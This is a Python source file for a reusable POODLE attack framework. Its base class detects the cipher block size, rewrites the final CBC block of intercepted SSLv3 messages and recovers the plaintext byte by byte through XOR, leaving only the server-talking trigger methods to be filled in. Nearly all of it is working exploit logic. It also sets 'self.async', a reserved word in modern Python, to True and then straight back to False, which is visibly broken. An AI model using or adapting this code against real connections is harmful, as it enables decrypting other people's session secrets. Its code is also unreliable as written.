class POODLE(object):
    """
    Framework for 2014 POODLE SSLv3 attack.
    See: https://www.imperialviolet.org/2014/10/14/poodle.html
    """
    PHASE_BOUNDS_CHECK = 0
    PHASE_EXPLOIT = 1

    def __init__(self):
        self.phase = POODLE.PHASE_BOUNDS_CHECK
        self.recovery_length = None
        self.block_edge = None
        self.block_size = None
        self.was_error = False
        self.was_success = False
        self.message = None
        self.plaintext = []
        self.target_block = None

        # Performance booster for find_byte() -call
        self.async = True
        self.async = False

    def mark_error(self):
        self.was_error = True
        return

    def mark_success(self):
        self.was_success = True
        return

    def run(self):
        if self.detect_block_info():
            print("Found block edge: %u, block size: %d bytes, recovery length: %d bytes, going for exploit!" %
                  (self.block_edge, self.block_size, self.recovery_length))
            if self.exploit():
                return self.plaintext

        return

    def exploit(self):
        block_max = int(self.recovery_length / self.block_size)
        for block in range(1, block_max):
            for i in reversed(range(self.block_size)):
                plain = self.find_byte(block, i)
                if not plain:
                    return None
                self.plaintext.append(plain)

        return self.plaintext

    def find_byte(self, block, byte):
        if block < 1:
            raise RuntimeError('Cannot work on block 0')
        self.target_block = block

        if self.async:
            return self._find_byte_async(block, byte)
        else:
            return self._find_byte(block, byte)

    def _find_byte(self, block, byte):
        prefix_length = self.block_size + byte
        suffix_length = self.block_size - byte

        attempts_to_make = 1500     # The theory is, that after 256 attempts, the byte is known. In practice, no.
        for tries in range(attempts_to_make):
            self.was_error = False
            self.was_success = False

            self.trigger('A' * (self.block_edge + prefix_length), 'A' * suffix_length)
            if self.was_success:
                char1 = self.block(block - 1)[-1]
                char2 = self.block(-2)[-1]

                # Python 2: Incoming message is a string, not bytes
                #plain = chr(ord(char1) ^ ord(char2) ^ (self.block_size - 1))
                plain_value = char1 ^ char2 ^ (self.block_size - 1)
                plain = chr(plain_value)
                print('Found block %u byte %u after %u tries: 0x%02x "%c"' % (block, byte, tries + 1, plain_value, plain))

                return plain

        print("Giving up after %d attempts." % attempts_to_make)

        return None

    def _find_byte_async(self, block, byte):
        prefix_length = self.block_size + byte
        suffix_length = self.block_size - byte

        attempts_to_make = 1500     # The theory is, that after 256 attempts, the byte is known. In practice, no.
        tries = self.trigger_find_byte(attempts_to_make, 'A' * (self.block_edge + prefix_length), 'A' * suffix_length)
        if tries is not None:
            char1 = self.block(block - 1)[-1]
            char2 = self.block(-2)[-1]

            plain_value = char1 ^ char2 ^ (self.block_size - 1)
            plain = chr(plain_value)
            print('Found block %u byte %u after %u tries: 0x%02x "%c"' % (block, byte, tries + 1, plain_value, plain))

            return plain

        print("Giving up after %d attempts." % attempts_to_make)

        return None

    def message_callback(self, msg):
        self.message = msg
        if self.phase != POODLE.PHASE_EXPLOIT:
            return False, msg
        return True, self.alter()

    def alter(self):
        # Python 3: Message is bytes already.
        msg = self.message
        msg = msg[:-self.block_size] + self.block(self.target_block)
        return msg

    def block(self, n):
        return self.message[n * self.block_size:(n + 1) * self.block_size]

    def detect_block_info(self):
        self.phase = POODLE.PHASE_BOUNDS_CHECK
        msg = self.trigger('')
        if not msg:
            print("detect_block_info() Failed! Didn't receive initial message. Exit.")
            return False
        reference = len(msg)
        self.recovery_length = len(self.message)

        for i in range(1, 15):
            msg = self.trigger('A' * i)
            if not msg:
                print("detect_block_info() Failed! Didn't receive a message. Exit.")
                return False
            self.block_size = len(msg) - reference
            if self.block_size != 0:
                self.block_edge = i
                break

        self.phase = POODLE.PHASE_EXPLOIT

        return True

    def trigger(self, prefix, suffix=''):
        """
        This is a base class. It doesn't have the implementation to talk to servers.

        trigger() -call will send a single request to attempt recover a byte.
        In all likelihood, a single call will fail. If it does not, thanks to CBC, a single byte
        can be recovered from the data.
        :param prefix: Bytes to prefix the secret data with
        :param suffix: Bytes to suffix the secret data with
        :return: nothing of relevance
        """
        raise NotImplementedError("Yes. Implement trigger()")

    def trigger_find_byte(self, attempts, prefix, suffix=''):
        """
        This is a base class. It doesn't have the implementation to talk to servers.

        trigger_find_byte() -call will send a burst of parallel requests to attempt recover a byte.
        In all likelihood, one of the requests will succeed and thanks to CBC, a single byte
        can be recovered from the data.
        :param attempts: Number of attempts before giving up
        :param prefix: Bytes to prefix the secret data with
        :param suffix: Bytes to suffix the secret data with
        :return: None, or the plaintext byte recovered
        """
        raise NotImplementedError("Yes. Implement trigger_find_byte()")
